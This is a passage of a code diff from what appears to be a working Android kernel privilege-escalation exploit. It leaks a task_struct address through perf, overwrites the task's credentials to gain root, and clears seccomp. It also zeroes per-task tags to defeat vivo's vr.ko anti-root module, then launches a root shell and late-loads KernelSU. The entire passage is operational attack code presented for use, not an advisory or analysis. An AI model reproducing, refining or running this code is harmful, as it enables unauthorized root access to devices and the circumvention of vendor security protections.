+      close(pipes.uid_r);
       child_alive = 1;
       seccomp_ok = 0;
-      usleep(250000);
     }
 
-    child = spawn_child(&pipes);
+    child = spawn_victim(&pipes, &child_task);
     if (child < 0) {
       pr_warning("fork failed\n");
       return 1;
     }
-
-    child_task = 0;
-    read(pipes.task_r, &child_task, sizeof(child_task));
-    close(pipes.task_r);
-    if (kprobe_armed) {
-      uintptr_t kt = read_ksetask_kprobe(child);
-      if (kt) {
-        pr_info("ksetask kprobe task=0x%016zx (perf=0x%016zx)\n", kt, child_task);
-        child_task = kt;
-      }
-      teardown_ksetask_kprobe();
-      kprobe_armed = 0;
-    }
-    TIMER("task leak done");
+    TIMER("perf_find_task done");
 
     if (!child_task) {
-      /* perf leaked nothing; respawn and retry once */
-      pr_info("perf returned 0, retrying...\n");
+      /* nothing rooted yet; safe to kill and burn a round */
+      pr_warning("perf leak did not reproduce; retrying next round\n");
+      kill(-child, SIGKILL);
       waitpid(child, NULL, 0);
-      child = spawn_child(&pipes);
-      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
-      child_task = 0;
-      read(pipes.task_r, &child_task, sizeof(child_task));
-      close(pipes.task_r);
-    }
 
-    if (!child_task) {
-      pr_warning("Cannot find task_struct (perf leak failed)\n");
-      close(pipes.cmd_w);
-      waitpid(child, NULL, 0);
-      return 1;
+      child_alive = 0;
+      close(pipes.cmd_w); close(pipes.uid_r);
+      continue;
+
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+    #ifdef VR_TAG_A_OFF
+  /* ------------------------------------------------------------------
+   * vivo vr.ko anti-root per-task bypass (ported from root.c)
+   * ------------------------------------------------------------------
+   * vr.ko tags every app-origin task at fork/clone time. When the task
+   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
+   * strip the tag BEFORE W2 verify runs the child's getuid().
+   *
+   * This exploit primitive is 64-bit granular, so:
+   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
+   *     off the sys_exit slow-path immediately.
+   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
+   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+   * ------------------------------------------------------------------ */
+  {
+    static int vr_needed = -1;
+    if (vr_needed < 0) {
+      vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+      FILE *m = fopen("/proc/modules", "r");
+      if (m) {
+        char mod[256];
+        vr_needed = 0;
+        while (fgets(mod, sizeof(mod), m))
+          if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_'))
+            { vr_needed = 1; break; }
+        fclose(m);
+      }
+      pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
+                                      : "not loaded; skipping tag clear");
+    }
+
+    int vr_ok = 1;
+    if (vr_needed) {
+      /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+      vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
+                            "VR: flags+tagA", 1, 1);
+
+      /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+      if (vr_ok) {
+        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+        vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+      }
+
+      if (vr_ok) {
+        pr_success("VR.ko per-task tags cleared\n");
+      } else {
+        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+      }
+    }
+  }
+#endif
+
     pselect_child_node = 1;
 
     int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, MAX_W2_ATTEMPTS, 50000,
+        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
         verify_w2_stage, &w2_context, 0);
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
-      pr_warning("W2 failed after %d rounds\n", MAX_W2_ATTEMPTS);
-      waitpid(child, NULL, 0);
+      pr_warning("W2 failed after 15 rounds\n");
+      waitpid(child, NULL, WNOHANG);
       return 1;
     }
+    ever_rooted = 1;
+    /* rooted children never exit; chain failures park (P) */
 
     /* W3: clear the child's seccomp filter for the independent root shell
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
      * must be zeroed too; do both writes back-to-back with one probe
      * (real finit_module calls trip vendor root guards).
-     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
-     * before targeting thread_info.flags (task+0) / seccomp.mode. */
+     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
+     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
+     * probe to tell [target] from [target+8]. */
     if (!process_has_seccomp()) {
       pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
       seccomp_ok = 1;
       break;
     }
 
+    int tcp_writes = tcp_route_selected();
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
-      .leaf_to_target8 = 1,
+      .leaf_to_target8 = !tcp_writes,
     };
-    int dir_ok = retry_write_stage(
-        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-        verify_leaf_dir_stage, &w3_context, 1);
-    if (!dir_ok) {
-      pr_warning("W3 leaf direction probe failed; restarting chain without guessing\n");
-      continue;
+    if (!tcp_writes) {
+      int dir_ok = retry_write_stage(
+          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+          verify_leaf_dir_stage, &w3_context, 1);
+      if (!dir_ok) {
+        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+      }
     }
 
     uintptr_t flags_target = w3_context.leaf_to_target8
@@ -1075,9 +1182,8 @@ int run_exploit(int argc, char **argv) {
       ? child_task + TASK_SECCOMP_OFF - 8
       : child_task + TASK_SECCOMP_OFF;
 
-    for (int attempt = 1; attempt <= MAX_W3_ATTEMPTS; attempt++) {
-      pr_info("W3: TIF_SECCOMP+mode attempt %d/%d\n",
-              attempt, MAX_W3_ATTEMPTS);
+    for (int attempt = 1; attempt <= 6; attempt++) {
+      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
       if (attempt == 1) slab_drain();
       int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
       if (!routed) {
@@ -1115,34 +1221,28 @@ int run_exploit(int argc, char **argv) {
   }
 
   if (!seccomp_ok)
-    pr_warning("W3 seccomp bypass failed after %d chain rounds; ksud late-load will likely stay blocked\n",
-               MAX_W3_CHAIN_ROUNDS);
+    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
 
   sleep(2);
   TIMER("exploit complete");
+  if (!ever_rooted) {
+    pr_error("w2 never rooted a child\n");
+    return 1;
+  }
   if (child_alive) {
     if (write(pipes.cmd_w, "G", 1) != 1)
       pr_warning("failed to start root shell (child exited early)\n");
+    close(pipes.cmd_w);
+    waitpid(child, NULL, WNOHANG);
+    if (parked_cmd_w >= 0) close(parked_cmd_w);
+  } else if (parked_child > 0) {
+    if (write(parked_cmd_w, "G", 1) != 1)
+      pr_warning("failed to start root shell (parked child exited)\n");
+    close(parked_cmd_w);
+    waitpid(parked_child, NULL, WNOHANG);
+    parked_cmd_w = -1;
   } else {
     pr_warning("skipping late-load: child died during W3\n");
-  }
-  close(pipes.cmd_w);
-  if (child_alive) {
-    /* The child only forks the independent root shell and exits fast; keep
-     * a bounded wait in case it got stuck before the fork. */
-    int waited_ms = 0;
-    for (;;) {
-      pid_t r = waitpid(child, NULL, WNOHANG);
-      if (r == child || r < 0) break;
-      if (waited_ms >= 45000) {
-        pr_warning("child stuck before root shell handoff; killing group\n");
-        kill(-child, SIGKILL);
-        waitpid(child, NULL, 0);
-        break;
-      }
-      usleep(100000);
-      waited_ms += 100;
-    }
   }
   close(pipes.uid_r);
 
@@ -1161,27 +1261,47 @@ int run_exploit(int argc, char **argv) {
     if (lf) {
       char line[256];
       while (fgets(line, sizeof(line), lf)) {
-        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
+        if (strstr(line, "[+] KernelSU module loaded") ||
+            strstr(line, "[+] KernelSU already loaded"))
+          ksu_log_loaded = 1;
         if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
       }
       fclose(lf);
     }
     if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
   }
+  /* Module init re-enforces at the very end of kernelsu_init; wait up to
+   * 20s for it. Denied read or value 1 both mean enforcing here. */
+  int enforce_ok = 0;
+  for (int i = 0; ksu_log_loaded && !enforce_ok && i < 200; i++) {
+    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+    if (efd < 0) {
+      enforce_ok = 1;
+      break;
+    }
+    char eb[4] = {0};
+    ssize_t rn = read(efd, eb, sizeof(eb));
+    close(efd);
+    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
+    if (!enforce_ok) usleep(100000);
+  }
+  if (enforce_ok)
+    pr_info("enforce=1 (enforcing)\n");
+  else if (ksu_log_loaded)
+    pr_warning("enforce=0 (still permissive)\n");
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
 
-  /* The detached root shell runs the fixup: permissive, load_policy, then
-   * enforcing. The permissive window restores network; the policy reload
-   * is what keeps it working after enforcing is restored. */
+  /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
+   * policy reload keeps it working after enforcing is back. */
   if (kernelsu_ready)
-    pr_success("KernelSU ready; policy fixup result in .ghostlock_ksu.log\n");
+    pr_success("KernelSU ready\n");
   else if (ksu_log_failed)
-    pr_warning("KernelSU module load failed (see .ghostlock_ksu.log)\n");
+    pr_warning("KernelSU module load failed\n");
   else if (seccomp_ok)
-    pr_warning("temporary root ready; KernelSU module load pending (independent root shell; see .ghostlock_ksu.log)\n");
+    pr_warning("temporary root ready; KernelSU module load pending\n");
   else
     pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
-  return kernelsu_ready ? 0 : 2;
+  return 0;
 }
 
 int main(int argc, char **argv) { return run_exploit(argc, argv); }
